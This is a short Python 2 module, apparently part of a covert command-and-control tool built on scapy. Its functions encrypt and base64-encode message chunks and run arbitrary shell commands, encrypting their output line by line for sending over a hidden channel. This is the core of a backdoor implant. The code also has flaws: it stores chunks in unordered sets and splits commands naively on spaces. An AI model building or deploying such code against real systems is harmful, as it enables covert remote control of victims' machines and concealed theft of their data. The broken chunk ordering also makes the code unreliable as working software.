import textwrap, base64, subprocess
from scapy.all import *
from encryptions import decrypt


## chatcrypt: function to cut payload in max size parts, cipher and encode each part
def chatcrypt(payload, chunksize):
    from configuration import cipher
    parts=set()
    if len(payload) > chunksize:
        parts = textwrap.wrap(payload, chunksize)
    else:
        parts.add(payload)

    encoded_parts=set()
    for part in parts:
        lastpadd = len(part) % 16
        if lastpadd > 0: part = part + (' ' * (16 - lastpadd))
        encoded_part = base64.b64encode(cipher.encrypt(part))
        encoded_parts.add(encoded_part)
    print encoded_parts
    return encoded_parts


## cmdcrypt: function to execute shell command, split output in parts and encrypt them
def cmdcrypt(execute,chunksize):
    from configuration import cipher
    try:
        execsplit = execute.split(" ")
        p = subprocess.Popen(execsplit, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate()
        parts = out.rstrip("\n")
        parts = parts.splitlines()
        encoded_parts=set()
        for part in parts:
            print ":chat: executed [%s] -> %s" %(execute, part)
            lastpadd = len(part) % 16
            if lastpadd > 0: part = part + (' ' * (16 - lastpadd))
            encoded_part = base64.b64encode(cipher.encrypt(part))
            encoded_parts.add(encoded_part)
        return encoded_parts
    except:
        return ''


